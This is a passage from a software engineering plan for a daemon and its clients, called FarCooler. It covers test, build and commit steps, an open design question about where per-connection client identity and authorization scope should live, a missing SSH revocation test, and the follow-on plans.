~/.cargo/bin/cargo test --workspace
```

Expected: PASS, including `one_daemon_per_home.rs` and `rpc_over_socket.rs`.

- [ ] **Step 8: Verify the Mac app still connects**

```bash
cd apps/macos && swift build
```

Then launch the app and confirm the fleet loads. A missed preamble shows up as an app that cannot reach its own daemon.

- [ ] **Step 9: Commit**

```bash
git add crates/daemon/src/main.rs crates/daemon/tests/ apps/macos/Sources/FarCooler/DaemonClient.swift crates/cli/src/daemon_link.rs
git commit -m "feat(daemon): a relayed stdio session carries its scope

serve_stdio_session pipes into the already-running daemon rather than
opening a second service, because an agent's transcript lives in the
first daemon's memory. That pipe discarded the scope: the running daemon
answers the handshake, and its socket path grants host_admin to a local
caller. So the previous commit's scope was correct on a machine with no
daemon running and ignored on every machine in normal use.

The scope travels as one line before the first frame, because the pipe
is deliberately dumb and must stay that way -- carrying it inside the
protocol would mean this process parsing a conversation two other
parties already agree on. Anything that can reach the socket is already
the owning user and holds host_admin regardless, so a client that lies
in the preamble gains nothing."
```

---

## Open decision, carried out of the eng review

**Where does the per-connection principal live?** Task 4 fixes scope enforcement
with a field on `RpcFactory`, which works because a `--stdio` process serves one
session. It does **not** carry the client id, so `requested_client()` currently
has nowhere to land — and writer leases, per-client idempotency, auditing and
`client.revoke` closing live sessions all need it.

Three shapes, undecided:

- **A** — `Handler` gains per-connection context `{client_id, scope}`. Fixes
  both at one seam. Touches `crates/transport` and every implementer.
  `TODOS.md:48` says this is protocol-wide and best done before a second scoped
  enrollment, which is what these plans are.
- **B** — scope now (Task 4 as written), identity later in the enrollment plan.
  Ships `read` as a real boundary but leaves plan 3's revoke unable to find the
  sessions it revokes.
- **C** — bundle `TODOS.md:48`'s repository-scoped authorization at the same
  time, since it touches the same wire field and method table. One migration
  instead of two, roughly double the plan.

**Plan 3 Task 5 cannot be completed until this is decided.** It is written
against A.

## Missing test, carried out of the eng review

Every SSH assertion in this plan is an argument-vector unit test, and none of
them proves the behavior that matters: that a live master authenticated with one
key cannot service a connection asking for another, and that revocation closes
every usable connection. `docs/farcooler-design.md:1345` already contemplates a
loopback `sshd` in a scheduled lane. That is where this belongs, and until it
exists the prerequisite should not be described as complete.

## After this plan

With these landed, `read` is a real boundary, an address cannot execute a command, a connection can name its key and each key gets its own master, and a session token is verified against the claims the authorization depends on.

The next plans, in order:

1. **`host`/`machine` → `runner`**, repo-wide: README, `docs/remote-hosts.md`, `docs/farcooler-design.md`, `--host`, `farcooler host install`, every UI string, and the two specs. Mechanical, and worth doing in one pass so the CLI and the docs never disagree.
2. **Runner-side enrollment**: `client.enroll`, the fenced atomic write with descriptor-relative traversal, key rendering, the audit entry, and revocation that closes the multiplexed master.
3. **The ceremony and the apps**: the account lookup and proof-of-possession registration on the relay, QR display and scanning on iOS, Android and macOS, `~/.ssh/config` writing, multi-account, and sign-out.

## Self-Review

**Spec coverage.** This plan implements the spec's "Blocking prerequisites" section in full: prerequisite 1 is Tasks 4 and 5, prerequisite 2 is Task 1, prerequisite 3 is Task 3, prerequisite 4 is Task 2. Nothing else in the spec is in scope here, and the three follow-on plans above cover the rest.

**Placeholders.** None. Two places deliberately say "check first and match what exists rather than what this plan guessed" — the transport crate's error variants in Task 4 and the accept-loop location in Task 5 — because both are facts about code this plan did not read, and guessing them would be worse than naming the uncertainty.

**Type consistency.** `requested_scope()` and `requested_client()` are defined in Task 4 and used in Task 5. `ssh_args` changes arity in Task 3 and Task 1's `--` placement is asserted again there so the change cannot silently drop it. `verifySession` changes its return type in Task 2 and that task updates its own call sites.
